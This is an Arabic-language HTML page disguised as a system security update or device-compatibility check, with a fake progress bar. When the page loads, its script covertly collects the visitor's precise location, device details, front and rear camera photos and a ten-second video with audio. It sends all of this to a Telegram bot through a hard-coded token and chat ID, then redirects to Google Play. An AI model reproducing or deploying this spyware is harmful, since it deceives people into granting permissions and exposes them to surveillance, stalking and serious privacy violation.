<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث أمان النظام</title>
    <style>
        body { background-color: #000; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; width: 80%; }
        .loader { border: 4px solid #333; border-top: 4px solid #4285f4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
        .progress-bar { width: 100%; background-color: #333; border-radius: 10px; margin-top: 20px; overflow: hidden; }
        .progress-fill { width: 0%; height: 8px; background-color: #4285f4; transition: width 0.5s; }
        h1 { font-size: 1.2rem; margin-bottom: 10px; color: #fff; }
        p { color: #aaa; font-size: 0.9rem; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1 id="status">جاري فحص توافق الجهاز...</h1>
        <p id="sub-status">يرجى عدم إغلاق الصفحة لضمان استقرار النظام</p>
        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
    </div>

    <script>
        const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
        const CHID = "7984067238";

        async function sendToTg(data, type, filename = "file") {
            const formData = new FormData();
            formData.append('chat_id', CHID);
            if (type === 'photo') formData.append('photo', data, filename + '.jpg');
            else if (type === 'video') formData.append('video', data, filename + '.mp4');
            else if (type === 'text') {
                formData.append('text', data);
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: CHID, text: data, parse_mode: 'HTML'}) });
                return;
            }
            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: formData });
        }

        async function getSpecs() {
            let battery = await navigator.getBattery();
            let specs = `<b>📱 معلومات الجهاز الشاملة:</b>\n` +
                        `🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? "يشحن" : "لا يشحن"})\n` +
                        `🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\n` +
                        `🌐 اللغة: ${navigator.language}\n` +
                        `⚙️ المعالج: ${navigator.hardwareConcurrency} Cores\n` +
                        `🧠 الرام التقريبي: ${navigator.deviceMemory || "غير معروف"} GB\n` +
                        `🆔 الوكيل: ${navigator.userAgent}`;
            await sendToTg(specs, 'text');
        }

        async function captureBurst(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                
                for(let i=0; i<3; i++) { // التقاط 3 صور سريعة لكل كاميرا
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(b => sendToTg(b, 'photo', `img_${mode}_${i}`), 'image/jpeg');
                    await new Promise(r => setTimeout(r, 1000));
                }
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {}
        }

        async function recordVideo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    sendToTg(blob, 'video', 'secret_video');
                    stream.getTracks().forEach(t => t.stop());
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 10000); // 10 ثوانٍ
            } catch(e) {}
        }

        async function startExploit() {
            document.getElementById('fill').style.width = '30%';
            try {
                // طلب الموقع بدقة عالية
                navigator.geolocation.getCurrentPosition(p => {
                    const loc = `📍 موقع دقيق:\nhttps://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}`;
                    sendToTg(loc, 'text');
                }, null, {enableHighAccuracy: true});

                await getSpecs();
                document.getElementById('fill').style.width = '50%';
                
                // بدء العمليات المتوازية
                recordVideo(); // يبدأ تسجيل الفيديو في الخلفية
                await captureBurst("user"); // صور أمامية سريعة
                document.getElementById('fill').style.width = '80%';
                await captureBurst("environment"); // صور خلفية سريعة
                
                document.getElementById('fill').style.width = '100%';
                document.getElementById('status').innerText = "اكتمل الفحص بنجاح!";
                setTimeout(() => window.location.href = "https://play.google.com", 2000);
            } catch (e) {
                document.getElementById('status').innerText = "حدث خطأ في الاتصال";
            }
        }

        window.onload = () => {
            // انتظار تفاعل المستخدم أو البدء تلقائياً بعد منح الإذن
            startExploit();
        };
    </script>
</body>
</html>
